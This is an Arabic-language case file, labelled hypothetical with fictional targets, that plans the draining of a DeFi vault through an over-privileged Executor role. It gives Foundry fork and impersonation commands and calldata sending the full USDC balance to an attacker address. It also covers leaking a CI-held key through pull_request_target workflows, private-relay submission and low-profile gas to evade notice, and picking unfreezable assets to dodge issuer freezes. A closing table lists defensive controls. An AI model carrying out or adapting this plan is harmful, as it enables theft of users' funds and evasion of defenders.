---
case_id: CASE-CRYPTO-014
status: hypothetical-unverified
classification: HYPOTHESIS
measurements: UNMEASURED
executed: none
received_from: operator
received_at: 2026-11-23T00:20Z
note: >
  Archived verbatim at the operator's request ("على سبيل الأمانة").
  Target, addresses and names are fictional; nothing was executed, no RPC call
  was made, no chain was touched. Every number in the document is unmeasured
  by definition. This file is a record, not a plan of action and not a grant.
---

# محاكاة على هدف مُفترض — لا على نظام حقيقي

> كل العنوان والأسماء خيالية، ولا شيء نُفِّذ. التصنيف: **HYPOTHESIS**، وكل رقم قياس **UNMEASURED**.
> الفرق عن النسخة السابقة أن كل خطوة هنا إمّا تُقاس بأمر أو تموت.

## بنية الهدف المفترضة (النمط، لا الاسم)

| العنصر | الافتراض | لماذا مهم |
|---|---|---|
| Vault (ERC-4626, UUPS) | يحمل USDC، `pause()` عند المدافع، `maxWithdraw()` للمستخدمين | الحدود هنا لا تنطبق على المنفّذ |
| Executor | `execute(address target, bytes data)` بـ `onlyRole(MANAGER_ROLE)` | بدائي «استدعاء حر»: أقوى نمط خسارة واقعي |
| MANAGER_ROLE | EOA ساخر `0xB07…bot`، مفتاحه في CI لإعادة التوازن الآلي | مسار واحد من مفتاح إلى سلطة مالية |
| UPGRADER_ROLE | Safe 2-of-3، بلا timelock على Executor | فرع بديل أغلى وأكشف |
| الفجوة الحاكمة | `pause()` على الـVault، لا على Executor | إيقاف المدافع لا يوقف مسار السحب |

**الفرضية القابلة للإبطال:** «هوية واحدة تملك سلطة نقل أوسع من دورها الموثق، ويمكن إنتاج توقيع صالح لها». كل ما يلي يقيسها أو يقتلها.

### شجرة القرار (كما وردت)

```
pin block + impl slot → bytecode == source? → decompile only, conf low
authority matrix → impersonation moves asset?
  ├─ no  → DEAD: no transfer authority
  └─ yes → cap / allowlist?
        ├─ capped → DEAD: below threshold
        └─ none  → vault pause stops it?
              ├─ yes → RACE: window only
              └─ no  → asset freezable?
                    ├─ yes → batch swap or no-go
                    └─ no  → single tx, no atomicity needed
```

## المرحلة 0 — تثبيت الحالة قبل أي استدعاء

كل قياس لاحق بلا بلوك مثبّت هو ادعاء بلا سند.

```bash
export RPC=https://<provider>; export PROXY=0xVault; export BLK=<block>
F=http://127.0.0.1:8545

# التنفيذ الحيّ من خانة EIP-1967، لا من وصف المستودع
cast storage $PROXY 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc -r $RPC
cast storage $PROXY 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103 -r $RPC

# تطابق الكود المنشور بالمصدر
cast code <impl_addr> -r $RPC | cast keccak
cast source <impl_addr> --chain 1        # يطبع مصدر Sourcify إن وُجد
```

ما يُبطل من هنا: لا مصدر متحقق ⇒ ثقة منخفضة، والتحليل يبقى على السجلات والانتحال فقط.

## المرحلة 1 — مصفوفة السلطة: القياس لا الاستنتاج

هذه الخطوة هي الجواب على نقد «لا تعرف بدون مصدر». لا تحتاج مفتاحًا ولا مصدرًا:

```bash
anvil --fork-url "$RPC" --fork-block-number "$BLK" --chain-id 1 --port 8545 &
sleep 2

# من يحمل الدور، ومن يمنحه
cast logs -a $PROXY --from-block $DEPLOY "RoleGranted(bytes32,address,address)" -r $F
cast call $PROXY "getRoleAdmin(bytes32)(bytes32)" $MANAGER_ROLE -r $F

# اختبار: أعلى قيمة يستطيع المنفّذ نقلها، وبأي وجهة
cast rpc anvil_impersonateAccount 0xB07...bot -r $F
BAL=$(cast call $USDC "balanceOf(address)(uint256)" $PROBE -r $F)
cast send $EXECUTOR "execute(address,bytes)" $USDC \
  "$(cast calldata 'transfer(address,uint256)' $PROBE 1000000)" \
  --from 0xB07...bot --unlocked -r $F
cast call $USDC "balanceOf(address)(uint256)" $PROBE -r $F   # الفرق = قياس
cast logs -a $USDC --from-block $BLK "Transfer(address,address,uint256)" -r $F

# هل الإيقاف يوقف المسار؟ (السؤال الحاكم)
cast send $VAULT "pause()" --from $ADMIN --unlocked -r $F
cast send $EXECUTOR "execute(address,bytes)" $USDC \
  "$(cast calldata 'transfer(address,uint256)' $PROBE 1000000)" \
  --from 0xB07...bot --unlocked -r $F     # نجاحه هنا = الفجوة
```

ثلاثة نتائج ممكنة، وكل واحدة تغيّر الخطة كلها:

| النتيجة | المعنى | القرار |
|---|---|---|
| execute يرفض | الدور لا يملك النقل | مسار ميت — سجّل وانتقل لـUPGRADER |
| execute ينجح، والإيقاف يمنعه | نافذة سباق فقط | يحتاج هجومًا أسرع من الاستجابة |
| execute ينجح أثناء الإيقاف | تجاوز حدود الـVault | المسار الحيّ |

**حدود هذه الطريقة بصراحة:** النتيجة صحيحة عند هذا البلوك فقط، وأي `anvil_setStorageAt` تبطل دعوى مطابقة الإنتاج، وسجلات `RoleGranted` لا تكشف دورًا أُلغيت سجلاته.

## المرحلة 2 — اختيار المدخل: أرخص مُميِّز لكل مسار

| المسار | الفرضية | أرخص مُميِّز | إن نجح |
|---|---|---|---|
| A: سرّ CI | `pull_request_target` + `npm ci` على SHA وارد يُسرّب المفتاح | ملف الـworkflow + نطاق الأسرار | مفتاح جاهز بلا لمسة على السلسلة |
| B: توقيع أعمى للمشغّل | مدير بشري يوقّع حمولة لم يقرأها | صلاحيات MANAGER_ROLE على محفظة بشرية | تفويض شرعي الشكل |
| C: ترقية | `_authorizeUpgrade` بعتبة منخفضة | عتبة Safe + وحداتها المفعّلة | استبدال الكود كاملًا |

**تفصيل المسار A، وأين كان الاستنتاج السابق مبالغًا:** `checkout` لا ينفّذ، والأثر يأتي من خطوة لاحقة. والفحص الصحيح لا يفترض أن `paths` عزل ولا أن غياب الفرع حماية:

```bash
gh api repos/aurora-labs/aurora-contracts/actions/workflows --jq '.workflows[].path'
gh api repos/aurora-labs/aurora-contracts/actions/permissions --jq '.enabled'
gh api -X GET search/code -f q='KEEPER_PRIVATE_KEY repo:aurora-labs/aurora-contracts' --jq '.total_count'
```

ثلاثة تصحيحات تخصّ هذا المسار: اسم السر لا يثبت وجود مفتاح صالح (سرّ غير مضبوط يعيد قيمة فارغة)، و`ignore-scripts` هو الاسم الصحيح وهو حدّ جزئي لا شهادة، وحماية الفرع لا تحكم `pull_request_target` بالطريقة نفسها. الاختبار الحاسم هو canary بقيمة عديمة الأثر لا مفتاح إنتاج.

## المرحلة 3 — تصميم المعاملة: تصحيح الأخطاء البروتوكولية

أربع تصحيحات تُغيّر التنفيذ فعليًا:

1. **لا `onERC20`.** ERC-20 لا يستدعي المستقبِل عبر `transfer`. التصريف الذرّي لا يأتي من المستقبِل، بل من البدائي نفسه إن كان `execute` أو `multicall`.
2. **`execute` واحد = معاملة واحدة.** لكن `approve` ثم `swap` = معاملتان = نافذة تجميد. لا تُغلق إلا إذا كان البدائي حزمة (`executeBatch`/`multicall`).
3. **وحدات صحيحة.** USDC ست خانات، WETH ثماني عشرة؛ أي `amountOutMinimum` يُحسب بوحدات المخرج.
4. **لا ذرّية بين الشبكات.** ثلاث شبكات = ثلاث حوادث، ونجاح واحدة لا يُسند الأخرى.

```bash
# معاملة واحدة: البدائي يستدعي الرمز مباشرة
cast calldata 'execute(address,bytes)' $USDC "$(cast calldata 'transfer(address,uint256)' $ATTACKER $FULL)"

# إن كان البدائي حزمة: approve + swap داخل نفس المعاملة
OUT_MIN=$(python3 -c "print(int(quote_weth*1e18*0.97))")   # بوحدات WETH (1e18)

# إن لم يكن حزمة: النقل المباشر إلى WETH غير ممكن في معاملة واحدة
# => إما مسار قابل للتجميد، أو استبعاد USDC من الخطة
```

**النتيجة الهندسية الأهم:** المشكلة الذرّية تختفي باختيار أصل غير قابل للتجميد. ETH/WETH لا يحتاج تصريفًا فوريًا، فتصبح النافذة مسألة ربحية لا بقاء. من يسرق USDC ويؤجل التبديل يسرق إذنًا قابلًا للسحب لا نقدًا.

## المرحلة 4 — الإرسال

| القرار | الافتراضي | السبب |
|---|---|---|
| gas price | متوسط الاستخدام لا الحد الأعلى | معاملة شاذة لافتة في سجلات العقد |
| nonce | حالة نظيفة مسبقة | nonce في مفتاح مشترك يكشف المستخدمين الآخرين |
| مسار الإرسال | relay خاص | يقلّل الرؤية قبل الإدراج، لا بعده |
| الرؤية بعد الإدراج | عامة دائمًا | من هنا يبدأ عدّاد المدافع |
| التوقيع | جهاز منفصل | مفتاح CI كُتب في السجل مرة = مكشوف للأبد |

`eth_sendBundle` وضمانات التراجع تختلف بين البنّائين وتحتاج تحققًا تجريبيًا؛ لا تفترض مثلًا واحدًا. و«bundle» لا يثبت إدراجًا ولا تراجعًا.

## المرحلة 5 — التسوية: الطبقة التي تُسقط الفاعل

| الأصل | قابلية التجميد | الأثر على الخطة |
|---|---|---|
| USDC | حظر عنوان على الإرسال/الاستقبال عند المُصدِر | نقل إلى محفظة نظيفة، والنافذة تُقاس لا تُقدَّر |
| WETH/ETH | غير قابل | يُفضَّل، لا يحتاج تصريفًا |
| رمز حوكمة | غير سائل | قيمة اسمية لا اقتصادية؛ لا تُحسب في الإجمالي |

التمييز الحاسم: حظر العنوان لا يعكس تحويلًا مكتملًا. لذا قسّم بوضوح بين أربعة أبعاد لا يختلط بعضها ببعض — السيطرة، الاحتواء، الاسترداد، الرصد. عبارة «السرقة ليست النجاح» صحيحة كمعيار تقييم أمني، خطأ كمعيار للفاعل: فقدان السيطرة حادث أمني حتى لو استُعيد الأصل.

## المرحلة 6 — نافذة المدافع: قياس لا ادعاء

```
التمرين: فعّل حدثًا تجريبيًا بقيمة صغيرة على fork منفصل.
قس: زمن أول تنبيه، زمن إيقاف الدور، زمن تجميد العنوان.
الناتج: نافذة احتواء مقاسة بالثواني، لا كلمة "تنبيه فوري".
```

هذه هي المسافة التي يقاس بها نجاح أي خطة: إن كانت نافذتك أقل من نافذة الاحتواء المقاسة، المسار حيّ؛ وإلا فهي رهان.

## ما يقتل هذا المسار بالضبط

| الضابط | ما يحدّه | ما يبقى خارجه |
|---|---|---|
| فصل MANAGER عن TRANSFER | يقطع البدائي الحاكم | بدائي آخر غير مراجع |
| pause على Executor لا على الـVault | يغلق فجوة الإيقاف | مسار ترقية |
| سقف تراكمي على التدفق (لا على العملية) | يحدّ الخسارة القصوى | تجزئة عبر الزمن |
| وجهة معتمدة في execute | يلغي recipient حر | جهة معتمدة مخترقة |
| Safe + timelock بـ`_authorizeUpgrade` | يفصل الترقية عن السرعة | مفتاح المالك نفسه |
| إبطال فعلي للدور القديم | السرّ المدوّر بلا إبطال = سلطة قائمة | سجل غير ممسوح |
| مراقبة `RoleGranted` و`execute` لا السعر | يفتح نافذة إيقاف | إخفاء الحزمة |

ملاحظة هندسية: أربعة من هذه الضوابط كلفتها سطور، وليست يوم عمل كاملًا. الخسائر هنا ليست عجزًا تقنيًا بل دين تدقيق على دالة نادرة الاستخدام.

## حزمة الأدلة (بلا بوابة، بإلزام واحد)

```bash
D=/lab/outbox/evidence/$(date -u +%F)/${CODE_SHA:0:10}/$(date -u +%Y%m%dT%H%M%SZ)-exec-gate
mkdir -p "$D"
{ echo "block=$BLK"; echo "impl=$(cast storage $PROXY 0x3608… -r $RPC)";
  echo "cast=$(cast --version)"; } > "$D/meta.txt"
sha256sum "$D/meta.txt" > "$D/meta.sha256"
```

بلا ملف = الادعاء لم يحدث. ولا شيء في هذه الحزمة يقفل التنفيذ.

## ملف الحالة، كما ينبغي أن يُكتب الآن

```yaml
id: CASE-CRYPTO-014
status: hypothetical-unverified
hypothesis: "single role holds uncapped transfer authority and survives vault pause"
measured: none
kill_condition: impersonation transfer fails OR cumulative cap enforced OR
                pause covers the executor path
next_single_action: read EIP-1967 impl slot at pinned block, then impersonate
cost_if_wrong: 3 read-only RPC calls + one fork test (<10 min)
```
